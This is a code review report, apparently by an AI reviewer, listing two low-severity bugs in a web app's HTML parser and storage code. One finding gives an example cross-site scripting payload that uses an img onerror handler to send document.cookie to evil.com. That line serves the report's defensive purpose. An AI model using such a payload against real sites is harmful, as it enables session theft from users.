# Debugger — cherrypicker (Cycle 24)

**Reviewer:** debugger (sonnet)
**Scope:** Root-cause analysis, edge cases, failure modes
**Date:** 2026-05-06

---

## Summary

Cycle 23 fixed two concrete bugs. Cycle 24 finds 1 new edge case in HTML sanitization and 1 latent store inconsistency.

---

## New Findings

### [C24-DB01-LOW] HTML event handler with spaces around `=` bypasses sanitization

**Files:** `apps/web/src/lib/parser/html.ts:42`
**Confidence:** High

**Failure scenario:** A malicious HTML file contains `<img onerror = "fetch('https://evil.com?c='+document.cookie)">`. The `normalizeHTML` regex `/\son\w+=(?:"[^"]*"|'[^']*')/gi` does not match because `=` is followed by a space before the quote. If this HTML is later rendered in a preview pane or report (not just parsed by SheetJS), the event handler executes.

**Fix:** `/\son\w+\s*=\s*(?:"[^"]*"|'[^']*')/gi`.

---

### [C24-DB02-LOW] store.svelte.ts loadFromStorage allows NaN/Infinity in totalTransactionCount

**Files:** `apps/web/src/lib/store.svelte.ts:291`
**Confidence:** Medium

`totalTransactionCount` is loaded with `typeof parsed.totalTransactionCount === 'number' ? parsed.totalTransactionCount : undefined`. This accepts `NaN`, `Infinity`, and `-Infinity` as valid numbers. A corrupted or manually crafted sessionStorage entry could propagate these values to the UI, causing `NaN` displays.

**Fix:** Add `Number.isFinite(parsed.totalTransactionCount)` guard.

---

## Carry-overs

| ID | Status | Notes |
|----|--------|-------|
| D-DEB-03: OFX date parser strips timezone | **OPEN** | Still present; `replace(/[^0-9].*$/, '')` strips timezone info |
| D-DEB-05: HTML forward-fill mutates array | **OPEN** | Still in-place mutation of rows array from SheetJS |
